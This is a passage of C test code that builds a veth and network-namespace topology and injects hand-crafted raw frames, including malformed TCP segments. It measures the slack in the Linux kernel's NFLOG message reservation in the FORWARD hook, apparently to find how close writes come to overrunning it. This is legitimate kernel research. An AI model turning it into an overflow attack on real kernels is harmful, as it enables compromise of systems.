/* ================= turn 539: the same slack budget, in the FORWARD hook ==============
 *
 * Turn 538 measured the NFLOG budget in LOCAL_IN and LOCAL_OUT and named what was
 * missing: "FORWARD is where the IFINDEX_OUTDEV slack would disappear, and it needs a
 * second interface: config D537 has no VETH, no DUMMY, and CONFIG_BRIDGE is off."
 * Config D538 is D537 + CONFIG_VETH=y (plus the PAGE_POOL it selects), and this battery
 * is the same ledger, the same three instruments, one hook over.
 *
 * The prediction, from nfulnl_log_packet() of 6.6.13 read line by line:
 *   - the *reservation* is a fixed sum with one conditional part,
 *         if (in && skb_mac_header_was_set(skb))   += hard_header_len + hwtype + hwlen
 *     and nothing else depends on the hook.  `in` is set in FORWARD exactly as in
 *     LOCAL_IN, so R0 should not move: 156.
 *   - the *written* set gains NFULA_IFINDEX_OUTDEV (8) because outdev is non-NULL, and
 *     moves nothing else (timestamp is written for hooknum <= NF_INET_FORWARD, and
 *     FORWARD == 2).  So W = 116 + 8 = 124, K = 32, margin 12.
 *   - with `meta mark set` in the rule, W = 132, K = 24, margin 4 -- the closest this
 *     tree has come to the 20 bytes the terminator needs.
 * If both numbers move together (reservation and writes), K stays 40 and the whole idea
 * collapses; that is the falsifier, and it is why R0 is measured here and not assumed.
 *
 * Topology, one veth pair and two namespaces:
 *      [ far ns ]  fv1 10.9.0.2/24 --veth-- fv0 10.9.0.1/24  [ this ns ]
 *      sends UDP to 10.8.0.5:9999        route 10.8.0.0/24 dev fv0, ip_forward=1
 * The far side is a forked child that unshares its own netns; the parent moves one end
 * of the pair into it with IFLA_NET_NS_PID.  Addresses, routes, MTUs and both ARP
 * entries are static, so no packet waits on ARP and the MTU is 65535, so no datagram is
 * fragmented (a fragment would be a second packet through FORWARD and a second message).
 *
 * Controls, each of which can fail:
 *   ctl.norule     the veth is up, ip_forward is on, no rule   -> 0 messages
 *   ctl.noipfwd    ip_forward 0 with the rule installed        -> 0 messages
 *   ctl.localin    the same rule in LOCAL_IN, far side sends to 10.9.0.1 -> 116/156
 *   ctl.big        one 3592-byte datagram, qthreshold 1        -> exactly 1 message
 * ================================================================================== */

#include <linux/if_link.h>
#include <linux/rtnetlink.h>
#include <linux/veth.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>

#ifndef NF_INET_FORWARD
#define NF_INET_FORWARD 2      /* the differ does not include linux/netfilter.h */
#endif

#define F539_ADDR_ME	0x0a090001U	/* 10.9.0.1, this side                 */
#define F539_ADDR_PEER	0x0a090002U	/* 10.9.0.2, far side                  */
#define F539_ADDR_DST	0x0a080005U	/* 10.8.0.5, never exists: forwarded   */
#define F539_NET_FAR	0x0a080000U	/* 10.8.0.0/24, the prefix in the route */
#define F539_PORT	9999
#define F539_MTU	65535

static const unsigned char f539_mac_me[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 };
static const unsigned char f539_mac_far[6] = { 0x02, 0x00, 0x00, 0x00, 0x00, 0x02 };

/* ---------- rtnetlink: veth pair, address, route, neighbour, netns move ---------- */

static int rtnl_open(void)
{
	struct sockaddr_nl sa;
	struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

	if (fd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -2;
	}
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	return fd;
}

static int rtnl_talk(int fd, struct nlmsghdr *nlh)
{
	struct sockaddr_nl sa;
	char rbuf[4096];
	struct nlmsghdr *rh;
	int r;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	nlh->nlmsg_flags |= NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = 1;
	nlh->nlmsg_pid = 0;
	if (sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -errno;
	r = (int)recv(fd, rbuf, sizeof(rbuf), 0);
	if (r < (int)(NLMSG_HDRLEN + sizeof(struct nlmsgerr)))
		return -1000;
	rh = (struct nlmsghdr *)rbuf;
	if (rh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(rh);

		return e->error;      /* 0 == ACK, negative == -errno */
	}
	return -1001;
}

static void rt_init(struct nlmsghdr *nlh, char *buf, int bufsz, int type, int payload)
{
	memset(buf, 0, (size_t)bufsz);
	nlh->nlmsg_len = (uint32_t)(NLMSG_HDRLEN + payload);
	nlh->nlmsg_type = (uint16_t)type;
}

static int f539_ifindex(const char *dev)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int idx = -1;

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", dev);
	if (ioctl(s, SIOCGIFINDEX, &ifr) == 0)
		idx = ifr.ifr_ifindex;
	close(s);
	return idx;
}

static int f539_mtu_get(const char *dev)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int m = -1;

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", dev);
	if (ioctl(s, SIOCGIFMTU, &ifr) == 0)
		m = ifr.ifr_mtu;
	close(s);
	return m;
}

static int f539_mtu_set(const char *dev, int mtu)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int rc;

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", dev);
	ifr.ifr_mtu = mtu;
	rc = ioctl(s, SIOCSIFMTU, &ifr);
	close(s);
	return rc;
}

static int f539_mac_set(const char *dev)
{
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int rc;

	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", dev);
	ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;
	memcpy(ifr.ifr_hwaddr.sa_data, f539_mac_me, 6);
	rc = ioctl(s, SIOCSIFHWADDR, &ifr);
	close(s);
	return rc;
}

/* a permanent neighbour entry: no packet may wait on ARP, and none may be lost to the
 * unresolved queue (3 packets) -- that would show up as a missing log message */
static int f539_arp(const char *dev, uint32_t dst, const unsigned char *mac)
{
	struct arpreq req;
	struct sockaddr_in *sin;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	int rc;

	if (s < 0)
		return -1;
	memset(&req, 0, sizeof(req));
	sin = (struct sockaddr_in *)&req.arp_pa;
	sin->sin_family = AF_INET;
	sin->sin_addr.s_addr = htonl(dst);
	req.arp_ha.sa_family = ARPHRD_ETHER;
	memcpy(req.arp_ha.sa_data, mac, 6);
	req.arp_flags = ATF_PERM | ATF_COM;
	snprintf(req.arp_dev, sizeof(req.arp_dev), "%s", dev);
	rc = ioctl(s, SIOCSARP, &req);
	close(s);
	return rc;
}

static int f539_veth_create(const char *a, const char *b)
{
	char buf[1024];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;
	struct nlattr *li, *infodata, *peer;
	struct ifinfomsg pifi;
	int fd, rc;

	rt_init(nlh, buf, (int)sizeof(buf), RTM_NEWLINK, sizeof(struct ifinfomsg));
	nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_EXCL;
	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	attr_put(nlh, IFLA_IFNAME, a, (int)strlen(a) + 1, NULL);
	li = nest_start(nlh, IFLA_LINKINFO, NULL);
	attr_put(nlh, IFLA_INFO_KIND, "veth", 5, NULL);
	infodata = nest_start(nlh, IFLA_INFO_DATA, NULL);
	peer = nest_start(nlh, VETH_INFO_PEER, NULL);
	/* VETH_INFO_PEER carries a bare ifinfomsg before its attributes */
	memset(&pifi, 0, sizeof(pifi));
	pifi.ifi_family = AF_UNSPEC;
	memcpy((char *)peer + NLA_HDRLEN, &pifi, sizeof(pifi));
	nlh->nlmsg_len = (uint32_t)((char *)peer - (char *)nlh) + NLA_HDRLEN +
			 (uint32_t)sizeof(pifi);
	attr_put(nlh, IFLA_IFNAME, b, (int)strlen(b) + 1, NULL);
	nest_end(nlh, peer);
	nest_end(nlh, infodata);
	nest_end(nlh, li);

	fd = rtnl_open();
	if (fd < 0)
		return -10;
	rc = rtnl_talk(fd, nlh);
	close(fd);
	return rc;
}

static int f539_link_to_ns(const char *dev, pid_t pid)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifinfomsg *ifi;
	uint32_t p = (uint32_t)pid;
	int fd, rc, idx = f539_ifindex(dev);

	if (idx < 0)
		return -20;
	rt_init(nlh, buf, (int)sizeof(buf), RTM_NEWLINK, sizeof(struct ifinfomsg));
	ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index = idx;
	attr_put(nlh, IFLA_NET_NS_PID, &p, 4, NULL);
	fd = rtnl_open();
	if (fd < 0)
		return -21;
	rc = rtnl_talk(fd, nlh);
	close(fd);
	return rc;
}

static int f539_addr_add(const char *dev, uint32_t addr, int plen)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct ifaddrmsg *ifa;
	uint32_t be = htonl(addr);
	int fd, rc, idx = f539_ifindex(dev);

	if (idx < 0)
		return -30;
	rt_init(nlh, buf, (int)sizeof(buf), RTM_NEWADDR, sizeof(struct ifaddrmsg));
	nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REPLACE;
	ifa = (struct ifaddrmsg *)NLMSG_DATA(nlh);
	ifa->ifa_family = AF_INET;
	ifa->ifa_prefixlen = (uint8_t)plen;
	ifa->ifa_scope = 0;
	ifa->ifa_index = (uint32_t)idx;
	attr_put(nlh, IFA_LOCAL, &be, 4, NULL);
	attr_put(nlh, IFA_ADDRESS, &be, 4, NULL);
	fd = rtnl_open();
	if (fd < 0)
		return -31;
	rc = rtnl_talk(fd, nlh);
	close(fd);
	return rc;
}

static int f539_route_add(const char *dev, uint32_t dst, int plen, uint32_t gw)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct rtmsg *rtm;
	uint32_t bdst = htonl(dst), bgw = htonl(gw);
	int32_t oif;
	int fd, rc, idx = f539_ifindex(dev);

	if (idx < 0)
		return -40;
	rt_init(nlh, buf, (int)sizeof(buf), RTM_NEWROUTE, sizeof(struct rtmsg));
	nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_EXCL;
	rtm = (struct rtmsg *)NLMSG_DATA(nlh);
	rtm->rtm_family = AF_INET;
	rtm->rtm_dst_len = (uint8_t)plen;
	rtm->rtm_table = RT_TABLE_MAIN;
	rtm->rtm_protocol = RTPROT_BOOT;
	rtm->rtm_scope = gw ? RT_SCOPE_UNIVERSE : RT_SCOPE_LINK;
	rtm->rtm_type = RTN_UNICAST;
	attr_put(nlh, RTA_DST, &bdst, 4, NULL);
	if (gw)
		attr_put(nlh, RTA_GATEWAY, &bgw, 4, NULL);
	oif = idx;
	attr_put(nlh, RTA_OIF, &oif, 4, NULL);
	fd = rtnl_open();
	if (fd < 0)
		return -41;
	rc = rtnl_talk(fd, nlh);
	close(fd);
	return rc;
}

static int f539_sysctl(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int rc;

	if (fd < 0)
		return -1;
	rc = (int)write(fd, val, strlen(val));
	close(fd);
	return rc < 0 ? -1 : 0;
}

/* ---------- the far side: a forked child in its own netns ---------- */

static int f539_write_all(int fd, const char *s, int len)
{
	int off = 0;

	while (off < len) {
		int w = (int)write(fd, s + off, (size_t)(len - off));

		if (w <= 0)
			return -1;
		off += w;
	}
	return 0;
}

static int f539_read_line(int fd, char *buf, int n, int ms)
{
	struct timeval tv = { .tv_sec = ms / 1000, .tv_usec = (ms % 1000) * 1000 };
	fd_set rfds;
	int off = 0;

	buf[0] = 0;
	while (off < n - 1) {
		int r;

		FD_ZERO(&rfds);
		FD_SET(fd, &rfds);
		if (select(fd + 1, &rfds, NULL, NULL, &tv) <= 0)
			return -1;
		r = (int)read(fd, buf + off, 1);
		if (r <= 0)
			return -1;
		if (buf[off] == '\n') {
			buf[off] = 0;
			return off;
		}
		off += r;
	}
	return -1;
}

static int f539_peer_configure(void)
{
	int idx = f539_ifindex("fv1");

	if (idx < 0)
		return 11;
	f539_mtu_set("fv1", F539_MTU);
	if (f539_mac_set("fv1") < 0)
		return 12;
	f539_addr_add("fv1", F539_ADDR_PEER, 24);
	set_up("fv1");
	f539_arp("fv1", F539_ADDR_ME, f539_mac_me);
	f539_arp("fv1", F539_ADDR_DST, f539_mac_far);
	if (f539_route_add("fv1", F539_NET_FAR, 24, F539_ADDR_ME) < 0)
		return 13;
	f539_sysctl("/proc/sys/net/ipv4/ip_forward", "0");
	return 0;
}

static unsigned short f539_csum(const void *data, int len)
{
	const unsigned char *p = data;
	unsigned int sum = 0;

	while (len > 1) {
		sum += (unsigned int)((p[0] << 8) | p[1]);
		p += 2;
		len -= 2;
	}
	if (len)
		sum += (unsigned int)(p[0] << 8);
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return (unsigned short)~sum;
}

/* One datagram = one frame, built by hand and injected on fv1.
 *
 * The first version of this child used a UDP socket and a route via the gateway, and
 * the parent's own counters said what went wrong: fv0 received seven frames, but
 * InReceives moved by one.  Five of six datagrams were dying below IP, i.e. in the
 * neighbour/ARP path, which is exactly the machinery this experiment is not about.
 * An AF_PACKET frame has no neighbour, no route, no UDP stack and no offload: the bytes
 * that leave are the bytes the parent sees. */
static int f539_peer_send(int cnt, int plen, uint32_t dst_host, uint32_t src_host,
			  int *nsent, int *err)
{
	struct sockaddr_ll sll;
	unsigned char *f;
	int s, i, idx = f539_ifindex("fv1");
	int flen = 14 + 20 + 8 + plen;

	*nsent = 0;
	*err = 0;
	if (idx < 0)
		return 31;
	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		return 32;
	f = calloc(1, (size_t)flen);
	if (!f) {
		close(s);
		return 33;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);

	for (i = 0; i < cnt; i++) {
		uint32_t saddr = htonl(src_host), daddr = htonl(dst_host);
		unsigned char *ip = f + 14;
		unsigned char *udp = ip + 20;
		unsigned char *pay = udp + 8;
		ssize_t w;

		memcpy(f, f539_mac_me, 6);        /* dst: this side's fv0   */
		memcpy(f + 6, f539_mac_far, 6);   /* src: the far side      */
		f[12] = 0x08;
		f[13] = 0x00;
		memset(ip, 0, 20);
		ip[0] = 0x45;
		ip[1] = 0;
		ip[2] = (unsigned char)((20 + 8 + plen) >> 8);
		ip[3] = (unsigned char)((20 + 8 + plen) & 0xff);
		ip[4] = 0x00;
		ip[5] = (unsigned char)(0x40 + i);   /* a distinct id per packet */
		ip[6] = ip[7] = 0;                   /* no fragmentation         */
		ip[8] = 64;                           /* ttl                      */
		ip[9] = IPPROTO_UDP;
		memcpy(ip + 12, &saddr, 4);
		memcpy(ip + 16, &daddr, 4);
		*(unsigned short *)(ip + 10) = htons(f539_csum(ip, 20));
		udp[0] = 0x30;                        /* sport 12345              */
		udp[1] = 0x39;
		udp[2] = (unsigned char)(F539_PORT >> 8);
		udp[3] = (unsigned char)(F539_PORT & 0xff);
		udp[4] = (unsigned char)((8 + plen) >> 8);
		udp[5] = (unsigned char)((8 + plen) & 0xff);
		udp[6] = udp[7] = 0;                  /* no UDP checksum          */
		memset(pay, 0x77, (size_t)plen);

		w = sendto(s, f, (size_t)flen, 0, (struct sockaddr *)&sll, sizeof(sll));
		if (w < 0) {
			if (!*err)
				*err = errno;
		} else {
			(*nsent)++;
		}
	}
	free(f);
	close(s);
	return 0;
}

/* the kernel's own counters: InReceives and ForwDatagrams from /proc/net/snmp.
 * Field order differs between kernels, so the header line is read first. */
static int f539_snmp(unsigned long long *inrecv, unsigned long long *forw)
{
	FILE *f = fopen("/proc/net/snmp", "r");
	char hdr[512], dat[512];
	int idx_in = -1, idx_fw = -1;

	*inrecv = 0;
	*forw = 0;
	if (!f)
		return -1;
	while (fgets(hdr, sizeof(hdr), f)) {
		char *tok, *save = NULL;
		int i = 0;

		if (strncmp(hdr, "Ip:", 3))
			continue;
		if (!fgets(dat, sizeof(dat), f)) {
			fclose(f);
			return -2;
		}
		for (tok = strtok_r(hdr + 3, " \n", &save); tok;
		     tok = strtok_r(NULL, " \n", &save), i++) {
			if (!strcmp(tok, "InReceives"))
				idx_in = i;
			if (!strcmp(tok, "ForwDatagrams"))
				idx_fw = i;
		}
		i = 0;
		save = NULL;
		for (tok = strtok_r(dat + 3, " \n", &save); tok;
		     tok = strtok_r(NULL, " \n", &save), i++) {
			if (i == idx_in)
				*inrecv = strtoull(tok, NULL, 10);
			if (i == idx_fw)
				*forw = strtoull(tok, NULL, 10);
		}
		fclose(f);
		return 0;
	}
	fclose(f);
	return -3;
}

struct f539_devstat {
	unsigned long long rx_pkts, rx_errs, rx_drop, tx_pkts, tx_errs, tx_drop;
};

static int f539_devstat(const char *dev, struct f539_devstat *st)
{
	FILE *f = fopen("/proc/net/dev", "r");
	char line[256];
	int found = 0;

	memset(st, 0, sizeof(*st));
	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char name[64];
		unsigned long long rb, rp, re, rd, rf, rc, rframe, rcomp,
			tb, tp, te, td, tf, tc, tframe, tcomp;
		size_t L = strlen(dev);

		if (strncmp(line, " ", 1))
			continue;
		if (sscanf(line, " %63[^:]: %llu %llu %llu %llu %llu %llu %llu %llu"
			   " %llu %llu %llu %llu %llu %llu %llu %llu",
			   name, &rb, &rp, &re, &rd, &rf, &rc, &rframe, &rcomp,
			   &tb, &tp, &te, &td, &tf, &tc, &tframe, &tcomp) < 17)
			continue;
		if (strncmp(name, dev, L) || name[L])
			continue;
		st->rx_pkts = rp; st->rx_errs = re; st->rx_drop = rd;
		st->tx_pkts = tp; st->tx_errs = te; st->tx_drop = td;
		found = 1;
		break;
	}
	fclose(f);
	return found ? 0 : -2;
}

/* the child: never writes to stdout (run_new's pipe carries only the scenario line) */
static int f540_peer_tcp(int cnt, int *nsent, int *err, unsigned char *th, int *ncap);

#ifndef F541_DUMP
#define F541_DUMP 64
#endif
static int f541_peer_tcp2(int cnt, int plen, uint32_t dst, int doff, int flags,
			  int csummode, int optset, int want_fwd, int want_reply,
			  int *nsent, int *err, int *ncap, int *nreply,
			  int *rflags, unsigned char *fr);

static int f542_peer_open(int cid, uint32_t sport, char *rep, size_t n);
static int f542_peer_data(int cid, int doff, int flags, int payid,
			  const unsigned char pfx[4], char *rep, size_t n);
static void f542_peer_close(int cid);
static int f542_peer_extra(void);
static int f543_peer_data(int cid, int doff, int flags, int payid,
			  const unsigned char pfx[4], char *rep, size_t n);
static int f543_peer_probe(int plen, int doff, int flags, int *nsent,
			   int *ncap, unsigned char *fr, int *frlen);
static int f552_peer_v6(int plen, unsigned char *out, int *flen,
			int *nsent, int *ncap);
static int f539_peer_loop(int rfd, int wfd)
{
	char line[512];
	char rep[192];

	for (;;) {
		if (f539_read_line(rfd, line, sizeof(line), 60000) < 0)
			return 3;
		if (line[0] == 'G') {
			int rc = f539_peer_configure();

			snprintf(rep, sizeof(rep), "D %d\n", rc);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'S') {
			int cnt = 0, plen = 0, rc, nsent = 0, err = 0;
			unsigned int dst = F539_ADDR_DST;

			struct f539_devstat st;

			unsigned int src = F539_ADDR_PEER;

			sscanf(line + 1, "%d %d %u %u", &cnt, &plen, &dst, &src);
			rc = f539_peer_send(cnt, plen, (uint32_t)dst, (uint32_t)src,
					    &nsent, &err);
			f539_devstat("fv1", &st);
			snprintf(rep, sizeof(rep), "D %d %d %d %llu %llu\n", rc, nsent,
				 err, st.tx_pkts, st.tx_drop);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'T') {
			int cnt = 1, nsent = 0, err = 0, ncap = 0, rc, k;
			unsigned char th[20];
			char hex[64];

			sscanf(line + 1, "%d", &cnt);
			memset(th, 0, sizeof(th));
			memset(hex, 0, sizeof(hex));
			rc = f540_peer_tcp(cnt, &nsent, &err, th, &ncap);
			for (k = 0; k < 20; k++)
				sprintf(hex + 2 * k, "%02x", th[k]);
			snprintf(rep, sizeof(rep), "D %d %d %d %d %s\n",
				 rc, nsent, err, ncap, hex);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'Y') {
			int plen = 0, doff = 0x50, flags = 0x02, cm = 0, os = 0;
			int wf = 1, wr = 0, cnt = 1, rc, k;
			int nsent = 0, err = 0, ncap = 0, nreply = 0, rflags = 0;
			unsigned int dst = F539_ADDR_DST;
			unsigned char fr[F541_DUMP];
			char yrep[512];
			char yhex[2 * F541_DUMP + 1];

			sscanf(line + 1, "%d %d %u %d %d %d %d %d %d", &cnt, &plen, &dst,
			       &doff, &flags, &cm, &os, &wf, &wr);
			memset(fr, 0, sizeof(fr));
			memset(yhex, 0, sizeof(yhex));
			rc = f541_peer_tcp2(cnt, plen, (uint32_t)dst, doff, flags, cm, os,
					    wf, wr, &nsent, &err, &ncap, &nreply,
					    &rflags, fr);
			for (k = 0; k < F541_DUMP; k++)
				sprintf(yhex + 2 * k, "%02x", fr[k]);
			snprintf(yrep, sizeof(yrep), "D %d %d %d %d %d %d %s\n",
				 rc, nsent, err, ncap, nreply, rflags, yhex);
			f539_write_all(wfd, yrep, (int)strlen(yrep));
		} else if (line[0] == 'E') {
			int rc = f542_peer_extra();

			snprintf(rep, sizeof(rep), "D %d\n", rc);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'K') {
			int cid = 0, rc;
			unsigned int sport = 40000;

			sscanf(line + 1, "%d %u", &cid, &sport);
			rep[0] = 0;
			rc = f542_peer_open(cid, (uint32_t)sport, rep, sizeof(rep));
			if (rc < 0 || !rep[0])
				snprintf(rep, sizeof(rep), "D %d 0 0 0\n", rc < 0 ? rc : 9);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'V') {
			int plen = 16, nsent = 0, ncap = 0, flen = 0, rc, j, k = 0;
			unsigned char fr[512];
			char vrep[1200];

			sscanf(line + 1, "%d", &plen);
			memset(fr, 0, sizeof(fr));
			rc = f552_peer_v6(plen, fr, &flen, &nsent, &ncap);
			if (rc < 0)
				k = snprintf(vrep, sizeof(vrep), "D %d 0 0\n", rc);
			else
				k = snprintf(vrep, sizeof(vrep), "D %d %d %d ",
					     nsent, ncap, flen);
			for (j = 0; rc >= 0 && j < flen && (size_t)k + 4 < sizeof(vrep); j++)
				k += snprintf(vrep + k, sizeof(vrep) - (size_t)k, "%02x", fr[j]);
			if (rc >= 0)
				snprintf(vrep + k, sizeof(vrep) - (size_t)k, "\n");
			f539_write_all(wfd, vrep, (int)strlen(vrep));
		} else if (line[0] == 'N' && line[1] == '2') {
			int cid = 0, doff = 5, flags = 0x10, payid = 0, rc;
			unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0;
			unsigned char pfx[4];

			sscanf(line + 2, "%d %d %d %d %2x%2x%2x%2x", &cid, &doff, &flags,
			       &payid, &b0, &b1, &b2, &b3);
			pfx[0] = (unsigned char)b0;
			pfx[1] = (unsigned char)b1;
			pfx[2] = (unsigned char)b2;
			pfx[3] = (unsigned char)b3;
			rep[0] = 0;
			rc = f543_peer_data(cid, doff, flags, payid, pfx, rep,
					    sizeof(rep));
			if (rc < 0 || !rep[0])
				snprintf(rep, sizeof(rep), "D %d 0 0 0\n", rc < 0 ? rc : 9);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'Z') {
			int plen = 16, doff = 0x50, flags = 0x18, i, k = 0;
			int nsent = 0, ncap = 0, flen = 0;
			unsigned char fr[160];
			char zrep[512];

			sscanf(line + 1, "%d %d %d", &plen, &doff, &flags);
			memset(fr, 0, sizeof(fr));
			f543_peer_probe(plen, doff, flags, &nsent, &ncap, fr, &flen);
			k += snprintf(zrep + k, sizeof(zrep) - (size_t)k, "D %d %d %d ",
				      nsent, ncap, flen);
			for (i = 0; i < flen && (size_t)k + 2 < sizeof(zrep); i++)
				k += snprintf(zrep + k, sizeof(zrep) - (size_t)k, "%02x", fr[i]);
			snprintf(zrep + k, sizeof(zrep) - (size_t)k, "\n");
			f539_write_all(wfd, zrep, (int)strlen(zrep));
		} else if (line[0] == 'N') {
			int cid = 0, doff = 5, flags = 0x10, payid = 0, rc;
			unsigned int b0 = 0, b1 = 0, b2 = 0, b3 = 0;
			unsigned char pfx[4];

			/* %2x, not %x: "%x%x%x%x" eats all eight digits into the first
			 * conversion (measured on the third smoke run: the payload word
			 * arrived as 00 xx xx xx, so the door wrote doff 4 and the
			 * endpoint answered InErrs+1 with no checksum error) */
			sscanf(line + 1, "%d %d %d %d %2x%2x%2x%2x", &cid, &doff, &flags,
			       &payid, &b0, &b1, &b2, &b3);
			pfx[0] = (unsigned char)b0;
			pfx[1] = (unsigned char)b1;
			pfx[2] = (unsigned char)b2;
			pfx[3] = (unsigned char)b3;
			rep[0] = 0;
			rc = f542_peer_data(cid, doff, flags, payid, pfx, rep,
					    sizeof(rep));
			if (rc < 0 || !rep[0])
				snprintf(rep, sizeof(rep), "D %d 0 0 0\n", rc < 0 ? rc : 9);
			f539_write_all(wfd, rep, (int)strlen(rep));
		} else if (line[0] == 'C') {
			int cid = 0;

			sscanf(line + 1, "%d", &cid);
			f542_peer_close(cid);
			f539_write_all(wfd, "D 0\n", 4);
		} else if (line[0] == 'Q') {
			f539_write_all(wfd, "D 0\n", 4);
			return 0;
		}
	}
}

/* ---------- the near side ---------- */

struct f539_env {
	pid_t peer;
	int cmd;		/* parent -> peer */
	int ack;		/* peer -> parent */
	int veth_ok;
	int ipfwd;
	int rc_veth, rc_move, rc_addr, rc_route, rc_mtu, rc_mac, rc_arp, rc_up;
	int last_sent;		/* what the far side says it actually sent   */
	int last_err;		/* the first sendto() errno there, if any     */
	unsigned long long peer_tx, peer_txdrop;
};

static int f539_env_open(struct f539_env *e, char *out, size_t n)
{
	int c2p[2], p2c[2];
	pid_t pid;
	char line[64];
	int rc;

	memset(e, 0, sizeof(*e));
	e->cmd = e->ack = -1;
	if (pipe(c2p) < 0 || pipe(p2c) < 0) {
		snprintf(out, n, "setup=PIPE_FAIL");
		return -1;
	}
	pid = fork();
	if (pid == 0) {
		int devnull;

		close(c2p[0]);
		close(p2c[1]);
		devnull = open("/dev/null", O_WRONLY);
		if (devnull >= 0)
			dup2(devnull, 1);
		if (unshare(CLONE_NEWNET) < 0) {
			f539_write_all(c2p[1], "D 90 0 0\n", 9);
			_exit(1);
		}
		/* the parent must not move the interface before this namespace exists:
		 * IFLA_NET_NS_PID resolves the pid's *current* netns, and a fork that has
		 * not unshared yet still points at the parent's */
		f539_write_all(c2p[1], "R\n", 2);
		_exit(f539_peer_loop(p2c[0], c2p[1]));
	}
	e->peer = pid;
	e->cmd = p2c[1];
	e->ack = c2p[0];
	close(c2p[1]);
	close(p2c[0]);

	/* 0. wait for the far namespace to exist */
	if (f539_read_line(e->ack, line, sizeof(line), 20000) < 0 || line[0] != 'R') {
		snprintf(out, n, "setup=PEER_NETNS_FAIL");
		return -1;
	}

	/* 1. the pair, then one end into the child's namespace */
	rc = f539_veth_create("fv0", "fv1");
	e->rc_veth = rc;
	if (rc < 0) {
		snprintf(out, n, "setup=VETH_FAIL|rc=%d", rc);
		return -1;
	}
	rc = f539_link_to_ns("fv1", pid);
	e->rc_move = rc;
	if (rc < 0) {
		snprintf(out, n, "setup=NETNS_MOVE_FAIL|rc=%d", rc);
		return -1;
	}
	e->veth_ok = 1;

	/* 2. this side: MTU, MAC, address, route, forwarding, permanent neighbours */
	e->rc_mtu = f539_mtu_set("fv0", F539_MTU);
	e->rc_mac = f539_mac_set("fv0");
	e->rc_addr = f539_addr_add("fv0", F539_ADDR_ME, 24);
	if (e->rc_addr < 0) {
		snprintf(out, n, "setup=ADDR_FAIL|rc=%d", e->rc_addr);
		return -1;
	}
	e->rc_up = set_up("fv0");
	e->rc_arp = f539_arp("fv0", F539_ADDR_DST, f539_mac_far);
	e->rc_route = f539_route_add("fv0", F539_NET_FAR, 24, 0);
	if (e->rc_route < 0) {
		snprintf(out, n, "setup=ROUTE_FAIL|rc=%d", e->rc_route);
		return -1;
	}
	f539_sysctl("/proc/sys/net/ipv4/ip_forward", "1");
	f539_sysctl("/proc/sys/net/ipv4/conf/all/rp_filter", "0");
	f539_sysctl("/proc/sys/net/ipv4/conf/fv0/rp_filter", "0");
	e->ipfwd = 1;

	/* 3. the far side configures its end */
	if (f539_write_all(e->cmd, "G\n", 2) < 0) {
		snprintf(out, n, "setup=PEER_WRITE_FAIL");
		return -1;
	}
	if (f539_read_line(e->ack, line, sizeof(line), 20000) < 0 || line[0] != 'D') {
		snprintf(out, n, "setup=PEER_NO_REPLY");
		return -1;
	}
	if (atoi(line + 1) != 0) {
		snprintf(out, n, "setup=PEER_CONF_%d", atoi(line + 1));
		return -1;
	}
	return 0;
}

static void f539_env_close(struct f539_env *e)
{
	char line[64];

	if (e->cmd >= 0) {
